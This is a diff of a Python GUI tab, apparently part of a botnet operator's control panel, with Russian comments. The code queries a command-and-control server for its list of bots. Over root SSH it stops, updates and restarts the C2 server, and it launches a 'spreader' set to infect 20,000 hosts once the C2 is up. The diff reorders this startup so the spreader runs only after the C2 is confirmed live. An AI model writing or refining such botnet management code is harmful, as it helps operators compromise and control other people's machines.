@@ -220,7 +220,7 @@ class BotnetTab(ttk.Frame):
         for attempt in range(3):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(15)  # Увеличенный таймаут
+                sock.settimeout(15)
                 sock.connect((self.c2_host, self.c2_port))
                 sock.sendall(b"list\n")
                 data = b""
@@ -234,7 +234,7 @@ class BotnetTab(ttk.Frame):
                     raise Exception("empty response")
                 bots = json.loads(data)
                 self.after(0, self._update_tree_safe, bots)
-                return  # успех
+                return
             except Exception as e:
                 if attempt == 2:
                     now = time.time()
@@ -465,7 +465,7 @@ class BotnetTab(ttk.Frame):
                 self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
         threading.Thread(target=run, daemon=True).start()
 
-    # ----- Обновление VPS -----
+    # ----- Обновление VPS (исправленная версия) -----
     def update_vps(self):
         if not self.vps_pass:
             self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
@@ -479,19 +479,24 @@ class BotnetTab(ttk.Frame):
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=10)
 
-                stop_cmd = "screen -ls | grep -E 'c2|spreader' | awk -F. '{print $1}' | xargs -I {} screen -S {} -X quit 2>/dev/null; pkill -9 -f botnet/c2.py; pkill -9 -f botnet/spreader.py"
+                # Остановка всего
+                stop_cmd = "pkill -9 -f botnet/c2.py; pkill -9 -f botnet/spreader.py; screen -ls | awk '/\\./{print $1}' | xargs -I {} screen -S {} -X quit 2>/dev/null"
                 client.exec_command(stop_cmd)
 
+                # Обновление кода
                 update_cmd = "cd /root/c2 && git fetch origin main && git reset --hard origin/main"
                 stdin, stdout, stderr = client.exec_command(update_cmd)
                 out = stdout.read().decode()
                 err = stderr.read().decode()
                 self.spread_log.insert(tk.END, out + "\n" + err + "\n")
 
+                # Установка только необходимого (без падений)
+                install_cmd = "pip3 install psycopg2-binary 2>&1 || true"
+                client.exec_command(install_cmd)
+
+                # Запуск C2
                 start_c2 = "cd /root/c2 && screen -dmS c2 python3 /root/c2/botnet/c2.py"
-                start_spreader = "cd /root/c2 && screen -dmS spreader python3 -u /root/c2/botnet/spreader.py --count 20000"
                 client.exec_command(start_c2)
-                client.exec_command(start_spreader)
 
                 time.sleep(3)
                 check_cmd = "ss -tlnp | grep 80"
@@ -500,12 +505,11 @@ class BotnetTab(ttk.Frame):
                 self.spread_log.insert(tk.END, f"Ports:\n{port_info}")
                 if "80" in port_info:
                     self.spread_log.insert(tk.END, "[+] C2 запущен успешно\n")
+                    # Запускаем спредер, только если C2 жив
+                    client.exec_command("cd /root/c2 && screen -dmS spreader python3 -u /root/c2/botnet/spreader.py --count 20000")
+                else:
+                    self.spread_log.insert(tk.END, "[!] C2 не запустился, проверьте логи на VPS\n")
                 client.close()
             except Exception as e:
                 self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
         threading.Thread(target=run, daemon=True).start()
-
-    # ----- Статистика (график-заглушка) -----
-    def update_stats(self):
-        # Позже заменим на matplotlib
-        pass
